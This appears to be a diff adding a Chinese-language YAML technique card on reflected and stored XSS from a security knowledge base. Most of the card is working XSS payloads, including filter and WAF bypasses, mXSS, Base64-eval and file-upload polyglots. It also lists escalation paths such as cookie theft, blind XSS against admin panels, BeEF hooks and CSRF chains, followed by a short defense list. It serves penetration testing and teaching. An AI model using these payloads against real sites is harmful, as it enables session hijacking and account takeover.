@@ -1,0 +1,83 @@
+# 技术卡片: XSS - 反射型与存储型
+# 分类: xss / reflected-stored
+# 版本: 1.0
+# 日期: 2026-07-21
+# 来源: SecAtlas KB-XSS-01/02
+
+id: "xss-reflected-stored"
+name: "XSS 反射型与存储型攻击"
+category: "xss"
+subcategory: "reflected-stored"
+severity: "high"
+
+description: |
+  反射型：用户输入直接回显在 HTTP 响应中，未做 HTML 实体编码。
+  存储型：恶意脚本被保存到服务端，所有访问者浏览器执行。
+
+trigger_signals:
+  - "输入回显在页面中，< > \" ' & 未转义"
+  - "评论/个人资料/私信等存储后回显功能"
+  - "输入 <script>alert(1)</script> 后弹窗"
+  - "无 CSP 头或 CSP 配置薄弱"
+
+payloads:
+  basic:
+    - '<script>alert(document.domain)</script>'
+    - '<img src=x onerror=alert(1)>'
+    - '<svg onload=alert(1)>'
+    - '<body onload=alert(1)>'
+
+  attribute_injection:
+    - '"><script>alert(1)</script>'
+    - '"onmouseover="alert(1)'
+    - '"autofocus onfocus="alert(1)'
+    - 'jav&#x09;ascript:alert(1)  # js pseudo-protocol'
+
+  bypass_filters:
+    - '<ScRiPt>alert(1)</ScRiPt>  # 大小写混淆'
+    - '<scr<script>ipt>alert(1)</scr</script>ipt>  # 嵌套绕过'
+    - '<img src=x onerror=&#97lert(1)>  # HTML 实体编码'
+    - '<<script>alert(1)//<</script>  # 标签破坏'
+    - '<details open ontoggle=alert(1)>  # 事件属性替代'
+
+  waf_bypass:
+    - '<svg><animatetransform onbegin=alert(1)>  # SVG 事件'
+    - '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>  # mXSS'
+    - 'eval(atob("YWxlcnQoMSk="))  # Base64 编码'
+
+  stored_persistent:
+    - technique: "在评论/资料字段提交 payload → 刷新页面 → 所有访问者触发"
+    - admin_panel: "Blind XSS: 注入后台管理面板的 payload → OOB 窃取管理员 cookie"
+
+  file_upload_xss:
+    - svg_file: '<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>'
+    - html_file: '<html><body><script>alert(document.cookie)</script></body></html>'
+    - polyglot_gif: 'GIF89a=1;alert(1)//'
+
+success_indicators:
+  - "弹窗 alert(document.domain)"
+  - "XSS Hunter / Burp Collaborator 收到请求"
+  - "窃取到 cookie/session token"
+
+prerequisites:
+  - "输入未做 HTML 实体编码"
+  - "输出位置在 HTML body/属性/JS 块中"
+  - "无有效 CSP 拦截"
+
+upgrade_paths:
+  - "窃取 session cookie → 账户接管"
+  - "BeEF hook → 浏览器持久控制"
+  - "CSRF 链 → 强制操作"
+  - "CSP bypass → 更隐蔽的攻击"
+
+defense:
+  - "输出上下文感知编码（HTML 实体/JS 编码/URL 编码）"
+  - "Content-Security-Policy 头"
+  - "HttpOnly + Secure Cookie"
+  - "DOMPurify 净化 HTML"
+  - "输入验证白名单"
+
+sources:
+  - kb: "KB-XSS-01 / KB-XSS-02 / KB-XSS-10"
+  - ref: "PortSwigger: XSS"
+  - ref: "CWE-79"
